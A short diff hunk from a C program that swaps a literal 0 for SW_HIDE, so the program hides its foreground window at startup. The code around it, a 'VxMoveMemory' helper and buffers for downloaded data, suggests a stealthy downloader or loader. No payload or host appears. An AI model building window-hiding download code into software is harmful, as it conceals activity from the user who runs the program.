@@ -22,7 +22,7 @@ PVOID VxMoveMemory(PVOID dest, const PVOID src, SIZE_T len)
 
 int main()
 {
-    ShowWindow(GetForegroundWindow(), 0);
+    ShowWindow(GetForegroundWindow(), SW_HIDE);
     DWORD dwSize = 0;
     DWORD dwDownloaded = 0;
     LPSTR pszOutBuffer;
